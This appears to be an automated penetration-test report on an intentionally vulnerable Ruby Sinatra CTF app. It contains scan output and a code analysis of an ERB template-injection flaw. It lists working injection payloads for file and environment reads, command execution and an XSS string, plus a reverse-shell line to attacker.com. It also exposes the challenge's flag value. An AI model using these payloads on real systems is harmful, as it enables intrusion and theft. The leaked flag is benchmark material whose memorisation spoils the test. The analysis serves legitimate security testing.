# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-28 16:14 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
4567/tcp  open  tram?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Content-Length: 607
|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/client.rb:268:in `execute'
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/client.rb:268:in `try_to_finish'
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/client.rb:287:in `eagerly_finish'
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/server.rb:449:in `process_client'
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/server.rb:245:in `block in run'
|     /usr/local/bundle/gems/puma-6.4.2/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html;charset=utf-8
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Content-Length: 2717
|     <!doctype html>
|     <!doctype html>
|     <html lang="en">
|     <head> 
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
|     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
|     <title>Text Generator</title>
|     </head>
|     <body>
|     <!-- Navbar -->
|     <nav class="navbar navbar-expand-lg navbar-light bg-light">
|     class="navbar-brand" href="#">Text Generator</a>
|     <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
|     <span class="navbar-toggler-icon"></span>
|_    </button>
7777/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
9999/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
49158/tcp open  http      Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 23:14:32 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 23:14:17 GMT
|     Content-Length: 14
|_    auth required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4567-TCP:V=7.97%I=7%D=10/28%Time=69014E49%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,B4C,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nX-XSS-Protection:\x201;\x20mode=block\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Leng
SF:th:\x202717\r\n\r\n<!doctype\x20html>\n<!doctype\x20html>\n<html\x20lan
SF:g=\"en\">\n\x20\x20<head>\x20\n\x20\x20\x20\x20<meta\x20charset=\"utf-8
SF:\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1,\x20shrink-to-fit=no\">\x20\n\x20\x20\x20\
SF:x20<link\x20href=\"https://maxcdn\.bootstrapcdn\.com/bootstrap/4\.5\.2/
SF:css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n\x20\x20\x20\x20<ti
SF:tle>Text\x20Generator</title>\n\x20\x20</head>\n\x20\x20<body>\n\x20\x2
SF:0\x20\x20<!--\x20Navbar\x20-->\n\x20\x20\x20\x20<nav\x20class=\"navbar\
SF:x20navbar-expand-lg\x20navbar-light\x20bg-light\">\n\x20\x20\x20\x20\x2
SF:0\x20<a\x20class=\"navbar-brand\"\x20href=\"#\">Text\x20Generator</a>\n
SF:\x20\x20\x20\x20\x20\x20<button\x20class=\"navbar-toggler\"\x20type=\"b
SF:utton\"\x20data-toggle=\"collapse\"\x20data-target=\"#navbarNav\"\x20ar
SF:ia-controls=\"navbarNav\"\x20aria-expanded=\"false\"\x20aria-label=\"To
SF:ggle\x20navigation\">\n\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\
SF:"navbar-toggler-icon\"></span>\n\x20\x20\x20\x20\x20\x20</button>\n\x20
SF:")%r(GenericLines,2AC,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Le
SF:ngth:\x20607\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP
SF:\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20open
SF:\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::
SF:HttpParserError\)\n/usr/local/bundle/gems/puma-6\.4\.2/lib/puma/client\
SF:.rb:268:in\x20`execute'\n/usr/local/bundle/gems/puma-6\.4\.2/lib/puma/c
SF:lient\.rb:268:in\x20`try_to_finish'\n/usr/local/bundle/gems/puma-6\.4\.
SF:2/lib/puma/client\.rb:287:in\x20`eagerly_finish'\n/usr/local/bundle/gem
SF:s/puma-6\.4\.2/lib/puma/server\.rb:449:in\x20`process_client'\n/usr/loc
SF:al/bundle/gems/puma-6\.4\.2/lib/puma/server\.rb:245:in\x20`block\x20in\
SF:x20run'\n/usr/local/bundle/gems/puma-6\.4\.2/lib/puma/thread_pool\.rb:1
SF:55:in\x20`block\x20in\x20spawn_thread'HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49158-TCP:V=7.97%I=7%D=10/28%Time=69014E49%P=arm-apple-darwin24.4.0
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\n
SF:Content-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x
SF:20'none';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20scr
SF:ipt-src-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nTailscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-
SF:gec2eb9730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x2
SF:0DENY\r\nDate:\x20Tue,\x2028\x20Oct\x202025\x2023:14:17\x20GMT\r\nConte
SF:nt-Length:\x2014\r\n\r\nauth\x20required\n")%r(HTTPOptions,192,"HTTP/1\
SF:.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-src\x2
SF:0'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20scri
SF:pt-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale-Ver
SF:sion:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x20202
SF:5\x2023:14:17\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20required\n
SF:")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,192,"HTT
SF:P/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20
SF:script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale
SF:-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\
SF:x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x2
SF:02025\x2023:14:32\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requir
SF:ed\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.43 seconds


## Subdomain Discovery (subfinder)
Status: success
mail03.regency.localhost
tools.sonoma.edu.localhost
exchvm.nwcnet.localhost
mail.regency.localhost
server02.counterintel.localhost
sbs.allsaintsschool.localhost
naeu2.naeuinc.localhost
fndlync01.5ninesdata.localhost
autodiscover.regency.localhost
owa.regency.localhost
server2.hunter.localhost
www.localhost
mail.localhost
autodiscover.localhost
mse-ca-mail.corp.mse.localhost
mail02.regency.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:4567[0m [200 OK] [1mBootstrap[0m[[1m[32m4.5.2[0m], [1mHTML5[0m, [1mIP[0m[[0m[22m::1[0m], [1mJQuery[0m, [1mScript[0m, [1mTitle[0m[[1m[33mText Generator[0m], [1mUncommonHeaders[0m[[0m[22mx-content-type-options[0m], [1mX-Frame-Options[0m[[0m[22mSAMEORIGIN[0m], [1mX-XSS-Protection[0m[[0m[22m1; mode=block[0m]

## Code Analysis
# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings adhere to this scope and have been verified to meet the "In-Scope" criteria.

## In-Scope: Network-Reachable Components

A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms (none exist in this application)
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

## Out-of-Scope: Locally Executable Only

A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface
- A development environment's internal tooling
- CI/CD pipeline scripts or build tools
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts that require manual opening in a browser (not served by the application)

**Finding:** All components identified in this analysis are network-accessible through the Sinatra web server listening on port 4567. No out-of-scope components were identified in the attack surface analysis.

---

## 1. Executive Summary

This Ruby Sinatra web application represents a **CRITICAL SECURITY RISK** suitable for penetration testing and CTF (Capture The Flag) exercises. The application is a minimal text generation service with only 157 lines of code that exposes a **Server-Side Template Injection (SSTI) vulnerability** leading to Remote Code Execution (RCE). The application has no authentication, authorization, or session management, making all endpoints publicly accessible without credentials.

The most severe architectural security decision is the use of unsafe ERB template evaluation with user-controlled input at `app.rb:14-15`, where `ERB.new("#{sentence}").result(binding)` allows arbitrary Ruby code execution. This vulnerability is compounded by the storage of a CTF flag in plaintext at multiple locations (`/app/flag.txt`, environment variable `FLAG`, and `.env` file), all accessible through template injection exploitation. Additional critical weaknesses include secrets committed to version control, complete absence of encryption mechanisms, no server-side input validation, missing security headers, and insecure Docker secret management practices.

The attack surface consists of only two HTTP endpoints (`GET /` and `POST /generate`), both publicly accessible without authentication. The primary exploitation path involves bypassing trivial client-side JavaScript validation and injecting Ruby code payloads through the `sentence` parameter to achieve full system compromise, flag exfiltration, and potential container escape. This application serves as an intentional vulnerable target, demonstrating multiple real-world security anti-patterns that penetration testers should prioritize during assessment.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built using **Ruby 3.1.2** with the **Sinatra 3.2.0** web framework, a minimalist DSL-based micro-framework that provides routing and template rendering without the comprehensive security features found in full-stack frameworks like Ruby on Rails. The container runtime uses Ruby 3.1.2 (specified in `app/Dockerfile`), while the host development environment runs Ruby 2.6.10p210. The web server is **Puma 6.4.2**, a modern multi-threaded Ruby web server configured to bind to all network interfaces (`0.0.0.0:4567`) as specified in `app/app.rb:3`. The template engine is **ERB (Embedded Ruby)**, Ruby's native templating system that provides no sandboxing and has full access to the Ruby execution context when used with the `binding` parameter.

**Security Implications:** Sinatra's minimalist philosophy places security responsibility entirely on the developer, unlike opinionated frameworks that enforce security defaults. The framework includes `rack-protection 3.2.0` middleware providing basic HTTP-header-based protections (XSS headers, frame options, path traversal prevention), but these do not mitigate application-layer vulnerabilities like SSTI. Ruby 3.1.2, while supported, is not the latest stable version (3.2.x and 3.3.x are available) and should be monitored for security patches. The most critical technology choice is ERB with `binding`, which exposes the entire Ruby execution context including environment variables, file system access, and system command execution capabilities—a dangerous combination when processing untrusted input.

**Dependencies Analysis:** The application has minimal dependencies (only `sinatra` and `puma` gems explicitly required), which reduces the dependency attack surface but also means no security-focused libraries are present. The transitive dependency tree includes **Rack 2.2.9**, an outdated version vulnerable to known CVEs including CVE-2024-26146 (header injection) and CVE-2024-25126 (ReDoS). The `rack-protection` gem (version 3.2.0) is current and provides CSRF protection by default, though the application's forms lack explicit CSRF tokens. Critical security dependencies absent from the stack include authentication libraries (Devise, Warden), authorization frameworks (Pundit, CanCanCan), input validation gems (dry-validation), rate limiting (Rack::Attack), and encryption libraries (bcrypt, argon2).

### Architectural Pattern

This is a **Containerized Monolith** deployment with a single-file application architecture. The entire application logic resides in `/app/app.rb` (157 lines), with no modular separation of concerns, no database layer, no external service integrations, and no microservices architecture. The application operates as a completely stateless service with ephemeral request/response cycles and no persistent storage beyond the flag file stored on the container filesystem. Docker containerization is configured via `app/Dockerfile` and orchestrated through `docker-compose.yml`, exposing port 4567 to the host machine with a basic health check endpoint (`curl -f http://localhost:4567`).

**Trust Boundaries:** The primary trust boundary is the network interface, as the application binds to all interfaces without network segmentation. There is no internal trust boundary between components since all logic resides in a single file with no service-to-service communication. The Docker container provides process isolation but runs as the **root user** (no USER directive in Dockerfile), meaning container escape would grant full system privileges. The lack of authentication eliminates any user-based trust boundaries—all network-accessible endpoints are equally trusted (or untrusted) from the application's perspective.

**Security Implications:** The monolithic single-file architecture makes the attack surface easy to analyze but also means any vulnerability provides complete application compromise with no defense-in-depth layers. The stateless design prevents session-based attacks but also eliminates the ability to implement rate limiting per user, account lockouts, or audit trails of user behavior. Running the container as root violates the principle of least privilege and significantly increases the impact of container escape vulnerabilities. The binding to `0.0.0.0` without firewall rules or network policies exposes the service to all network interfaces, increasing the attack surface in multi-homed environments.

### Critical Security Components

**Authentication & Authorization:** **NONE IMPLEMENTED**. The application has zero authentication mechanisms, no user management system, no login/logout endpoints, no session management, and no authorization checks. This design choice means all endpoints are publicly accessible without credentials, and there is no concept of users, roles, or permissions. While appropriate for a simple text generation service or CTF challenge, the lack of authentication combined with the RCE vulnerability means any network-connected attacker can achieve full system compromise.

**Session Management:** **NOT CONFIGURED**. Sinatra sessions are disabled by default and not enabled in this application. No session cookies are set (no `HttpOnly`, `Secure`, or `SameSite` flags configured), no session storage mechanism exists (no Redis, memcached, or database session store), and no session timeout or renewal logic is present. The application cannot maintain user state across requests.

**Input Validation:** **CLIENT-SIDE ONLY (TRIVIALLY BYPASSABLE)**. The application implements JavaScript-based validation at `app.rb:88-92` enforcing a regex pattern `/^[a-zA-Z0-9\s]+$/` (alphanumeric and spaces only) and limiting the `number` parameter to a maximum of 200. However, **NO SERVER-SIDE VALIDATION** exists. The server directly accepts `params[:sentence]` without sanitization (`app.rb:10`) and converts `params[:number]` to an integer without bounds checking (`app.rb:11`). This client-side-only approach is a critical security failure, as validation can be bypassed through direct HTTP requests (curl, Postman), browser developer tools (disable JavaScript), or proxy interception (Burp Suite, OWASP ZAP).

**Secrets Management:** **CRITICALLY INSECURE**. The CTF flag is stored in plaintext across multiple locations without encryption: `/app/flag.txt` (container filesystem), `.env` file (committed to version control), and `FLAG` environment variable (Docker ENV). The Dockerfile uses insecure secret handling with `ARG FLAG` and `RUN echo $FLAG > /app/flag.txt` (lines 10-13), embedding the secret in Docker image layers visible through `docker history`. Both `.env` and `app/flag.txt` are tracked in the git repository (commit 49be874), creating permanent exposure in repository history. File permissions are world-readable (644), and no secret rotation mechanism exists.

**Encryption:** **COMPLETELY ABSENT**. The application has no encryption libraries (no bcrypt, argon2, openssl gems), no TLS/SSL configuration (HTTP only on port 4567), no data-at-rest encryption for the flag, and no key management system. All communication occurs over plaintext HTTP, making it vulnerable to man-in-the-middle attacks and network eavesdropping.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Finding: NO AUTHENTICATION IMPLEMENTED**

This application has **zero authentication mechanisms**. There are no login or logout endpoints, no user registration functionality, no password hashing implementation, no token generation systems (JWT, session tokens, API keys), no OAuth/OIDC/SAML flows, no multi-factor authentication, and no password reset functionality. The absence of authentication is evidenced by the complete route inventory in `app/app.rb:5-19`, which shows only two endpoints: `GET /` (serving the index page, lines 5-7) and `POST /generate` (processing text generation, lines 9-19). Neither endpoint contains authentication checks, before filters, or credential validation logic.

**Security Impact:** All application endpoints are publicly accessible without credentials. Any network-connected attacker can interact with all functionality, including exploiting the SSTI vulnerability to execute arbitrary code, read the flag file, access environment variables, and potentially achieve container escape. The lack of authentication also eliminates the possibility of implementing user-based rate limiting, audit logging per user, or access control policies. This design is appropriate for a CTF challenge or proof-of-concept but represents a critical security weakness if this pattern were applied to production systems handling sensitive data.

### Session Management

**Finding: NO SESSION MANAGEMENT CONFIGURED**

Session management is completely absent from this application. Sinatra sessions are **disabled by default** and never enabled (no `enable :sessions` directive found in `app/app.rb`). The application configuration contains only a single directive: `set :bind, '0.0.0.0'` (line 3). Without session management, the application cannot set session cookies, meaning there are no `HttpOnly`, `Secure`, or `SameSite` attributes configured—these settings are not applicable as no cookies are ever created. No session storage mechanism exists (no Redis, memcached, database session store, or in-memory session hash), no session timeout or renewal logic is implemented, and no session fixation or hijacking protections are necessary (or possible).

**Session Cookie Configuration Analysis:** The specific file and line where session cookie flags would be configured do not exist, as sessions are entirely absent. If sessions were to be implemented, the configuration would typically appear in `app/app.rb` after the binding directive using:

```ruby
configure do
  enable :sessions
  set :session_secret, 'secure_random_secret_here'
  set :sessions, httponly: true, secure: true, same_site: :strict
end
```

However, this code is **not present** in the application. The absence of sessions creates a completely stateless architecture where each request is processed independently without maintaining user context across requests.

**Security Impact:** While the absence of sessions eliminates session-based attack vectors (session hijacking, fixation, CSRF via session tokens), it also prevents implementing security controls that require state persistence such as rate limiting per user session, account lockout after failed login attempts (though no login exists), or audit trails tracking user behavior across multiple requests. The lack of CSRF tokens in the form at `app.rb:59-70` is notable—while `rack-protection` may provide some default CSRF protection through HTTP header validation, the form itself contains no explicit CSRF token field, potentially allowing CSRF attacks if the rack-protection middleware is bypassed or misconfigured.

### Authorization Model

**Finding: NO AUTHORIZATION IMPLEMENTED**

The application implements **zero authorization controls**. There is no role-based access control (RBAC), no permission checking logic, no resource ownership validation, no multi-tenant isolation mechanisms, and no authorization middleware or before filters. The route definitions at `app/app.rb:5-7` and `app/app.rb:9-19` contain no authorization checks—no `before` blocks that validate permissions, no helper methods that check user roles, and no conditional logic that restricts access based on user attributes.

**Security Impact:** Without authorization, all network-accessible endpoints are equally accessible to all users (or in this case, all anonymous network connections). There is no concept of privileged versus unprivileged operations, no admin-only functionality to protect, and no resources that belong to specific users requiring ownership validation. This flat permission model means the SSTI vulnerability is universally exploitable by any attacker who can send HTTP requests to the server, with no intermediate authorization layer that could potentially mitigate exploitation.

### SSO/OAuth/OIDC Flows

**Finding: NOT APPLICABLE - NO EXTERNAL AUTHENTICATION**

The application does not implement any Single Sign-On (SSO), OAuth, or OpenID Connect (OIDC) flows. There are no callback endpoints for OAuth providers, no state or nonce parameter validation, no JWKS (JSON Web Key Set) fetchers for token verification, no authorization server discovery endpoints, and no SAML metadata handlers. The `Gemfile` at `app/Gemfile:3-4` shows only `sinatra` and `puma` dependencies with no authentication-related gems such as `omniauth`, `oauth2`, `openid_connect`, or `devise`.

**Security Impact:** Not applicable for this application. If SSO/OAuth were implemented in the future, critical security validations would need to include: `state` parameter validation to prevent CSRF in the OAuth flow (typically validated in a callback route like `/auth/callback`), `nonce` parameter validation in OIDC flows to prevent replay attacks (validated during ID token verification), proper redirect URI validation to prevent open redirects, and secure token storage with appropriate scoping and expiration handling.

### Authentication API Endpoints

**Finding: NO AUTHENTICATION ENDPOINTS EXIST**

There are no API endpoints used for authentication purposes. A comprehensive analysis reveals **zero authentication-related routes**:

- **Login:** No `/login`, `/signin`, `/auth`, or similar endpoints exist
- **Logout:** No `/logout`, `/signout`, or session termination endpoints exist  
- **Token Refresh:** No `/refresh`, `/token/renew`, or token rotation endpoints exist
- **Password Reset:** No `/password/reset`, `/forgot-password`, or password recovery endpoints exist
- **Registration:** No `/signup`, `/register`, or user creation endpoints exist
- **Token Validation:** No `/verify`, `/validate`, or token verification endpoints exist

The complete endpoint inventory consists solely of:
1. `GET /` - Index page (lines 5-7)
2. `POST /generate` - Text generation (lines 9-19)

**Security Impact:** The absence of authentication endpoints is consistent with the application's design as an unauthenticated service. However, this means there is no centralized point to implement authentication controls, monitor for authentication attacks (brute force, credential stuffing), or add security instrumentation like rate limiting on login attempts or account lockout policies.

---

## 4. Data Security & Storage

### Database Security

**Finding: NO DATABASE IMPLEMENTATION**

The application operates without any database layer. No database connection configurations exist, no database adapter gems are present in `app/Gemfile` (which contains only `sinatra` and `puma`), no ORM (Object-Relational Mapping) libraries like ActiveRecord or Sequel are included, and no database migration scripts are present. The application processes data ephemerally within the request/response cycle with no persistent storage beyond the filesystem-based flag file at `/app/flag.txt`.

**Security Impact:** The absence of a database eliminates entire classes of vulnerabilities including SQL injection, NoSQL injection, database privilege escalation, connection string exposure, and unencrypted database storage. However, this also means the application cannot implement persistent audit logging, cannot store security events for forensic analysis, and cannot maintain user state or historical data. If a database were added in the future, critical security controls would include parameterized queries (prepared statements) to prevent SQL injection, TLS-encrypted database connections, least-privilege database user accounts with minimal grants, encryption at rest for sensitive columns using transparent data encryption (TDE) or column-level encryption, and proper credential management for connection strings stored in environment variables rather than code.

### Data Flow Security

**Critical Finding: UNSANITIZED USER INPUT FLOWS DIRECTLY TO CODE EXECUTION**

The application's data flow represents a **critical security vulnerability** where user input travels directly from HTTP parameters through template interpolation to code execution without any intermediate validation, sanitization, or encoding. The data flow path is:

1. **Input Point:** HTTP POST request to `/generate` with parameters `sentence` and `number` (line 9)
2. **Parameter Extraction:** `sentence = params[:sentence]` (line 10) - **NO VALIDATION**
3. **Integer Conversion:** `number = params[:number].to_i` (line 11) - **NO BOUNDS CHECKING**
4. **Loop Initialization:** `(1..number).map` (line 13) - Vulnerable to resource exhaustion
5. **Template Injection:** `ERB.new("#{sentence}")` (line 14) - **DIRECT STRING INTERPOLATION**
6. **Code Execution:** `template.result(binding)` (line 15) - **FULL RUBY CONTEXT**
7. **Output Rendering:** `<%= line %>` (line 139) - Results rendered in HTML

**File Path:** `/app/app.rb`  
**Line Numbers:** 10, 14-15

**Vulnerable Code:**
```ruby
sentence = params[:sentence]  # Line 10: No validation
template = ERB.new("#{sentence}")  # Line 14: Direct interpolation
template.result(binding)  # Line 15: Execute with full binding context
```

The `binding` parameter in `template.result(binding)` provides the ERB template with **complete access** to the Ruby execution context, including all environment variables (`ENV['FLAG']`), file system operations (`File.read('/app/flag.txt')`), system command execution (backticks, `system()`, `exec()`), network operations, and process manipulation. This is the most dangerous way to use ERB templates, as it essentially provides arbitrary Ruby code execution to any attacker who can control the `sentence` parameter.

**Client-Side Validation Bypass:** The application implements JavaScript validation at lines 88-92 enforcing alphanumeric-only input, but this is **trivially bypassable**:

```javascript
var regex = /^[a-zA-Z0-9\s]+$/;
if(!regex.test($("#sentence").val())) {
  alert("Invalid input format");
  return false;
}
```

Bypass methods include:
- **Direct POST requests:** `curl -X POST http://target:4567/generate -d "sentence=<%= system('whoami') %>&number=1"`
- **Browser DevTools:** Disable JavaScript or modify validation function
- **Proxy interception:** Burp Suite/OWASP ZAP to intercept and modify POST body
- **Invalid Content-Type:** Send JSON or other formats not processed by form validation

**Attack Payloads:**

Flag exfiltration via file read:
```
sentence=<%= File.read('/app/flag.txt') %>
```

Flag exfiltration via environment variable:
```
sentence=<%= ENV['FLAG'] %>
```

System command execution:
```
sentence=<%= `cat /etc/passwd` %>
sentence=<%= system('whoami') %>
```

Reverse shell:
```
sentence=<%= `bash -i >& /dev/tcp/attacker.com/4444 0>&1` %>
```

**Security Implications:** This data flow represents a complete compromise of confidentiality, integrity, and availability. Attackers can read any file accessible to the Ruby process (including the flag, application source, environment variables, system files), execute arbitrary commands with the privileges of the running process (root in this container), modify application state and file system, and exfiltrate data through DNS, HTTP requests, or other out-of-band channels. The lack of server-side validation makes this vulnerability **remotely exploitable by unauthenticated attackers** with basic HTTP client knowledge.

### Data Protection Mechanisms

**Critical Finding: NO OUTPUT ENCODING**

The application renders user-controlled content without proper output encoding at `app/app.rb:139`:

```erb
<% @output.each do |line| %>
  <p><%= line %></p>  <!-- Line 139 -->
  <hr>
<% end %>
```

While ERB's `<%= %>` syntax typically provides HTML escaping by default in some frameworks, the `line` variable contains the **result of executing an ERB template** (`template.result(binding)` from line 15), which can produce raw HTML or JavaScript. This creates a **reflected Cross-Site Scripting (XSS) vulnerability** in addition to the SSTI/RCE vulnerability.

**XSS Attack Chain:**
```
1. Attacker payload: sentence=<%= "<script>alert(document.cookie)</script>" %>
2. ERB evaluation produces: <script>alert(document.cookie)</script>
3. Output rendering: <p><script>alert(document.cookie)</script></p>
4. Result: JavaScript execution in victim's browser
```

**Security Impact:** The XSS vulnerability enables session hijacking (if sessions existed), cookie theft, phishing attacks, website defacement, malicious redirects, and keylogging. Combined with the SSTI vulnerability, attackers can craft payloads that execute code server-side and inject malicious JavaScript client-side in a single request.

### Multi-tenant Data Isolation

**Finding: NOT APPLICABLE - SINGLE-TENANT ARCHITECTURE**

The application has no multi-tenancy implementation. It is a single-tenant stateless service with no user accounts, no tenant identifiers, no data sharing between users, and no tenant-level isolation requirements. The architecture processes each request independently without maintaining state or associating data with specific users or organizations.

**Security Impact:** Not applicable for the current architecture. If multi-tenancy were implemented in the future, critical security controls would include tenant ID filtering in all database queries (WHERE tenant_id = ?), row-level security policies enforced at the database level, schema-level isolation for complete data separation, proper indexing on tenant columns to prevent performance-based data leakage, and comprehensive testing for horizontal privilege escalation across tenant boundaries.

### Sensitive Data Inventory

**Critical Finding: FLAG STORAGE AT MULTIPLE LOCATIONS**

The CTF flag represents the primary sensitive data asset and is stored insecurely across multiple locations:

**Location 1: Container Filesystem**
- **File:** `/app/flag.txt`
- **Storage Method:** Plaintext file created during Docker build
- **Created By:** `Dockerfile` line 13: `RUN echo $FLAG > /app/flag.txt`
- **Permissions:** Likely 644 (world-readable)
- **Access Method:** Direct file read or SSTI exploitation

**Location 2: Environment Variable**
- **Variable:** `FLAG`
- **Defined In:** `Dockerfile` line 11: `ENV FLAG=${FLAG}`
- **Visibility:** Process environment, child processes, `docker inspect` output
- **Access Method:** SSTI with `ENV['FLAG']` or process inspection

**Location 3: Development .env File**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/.env`
- **Line:** 1
- **Content:** `FLAG="flag{c4ddca47-533e-432a-b5fa-1503c21c538c}"`
- **Visibility:** Committed to git repository (commit 49be874)
- **Permissions:** 644 (world-readable on host system)

**Location 4: Local Development File**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/flag.txt`
- **Line:** 1
- **Content:** `flag{ASD}` (development placeholder)
- **Visibility:** Committed to git repository

**Location 5: Docker Image Layers**
- **Embedded In:** Docker image via `ARG FLAG` (Dockerfile line 10)
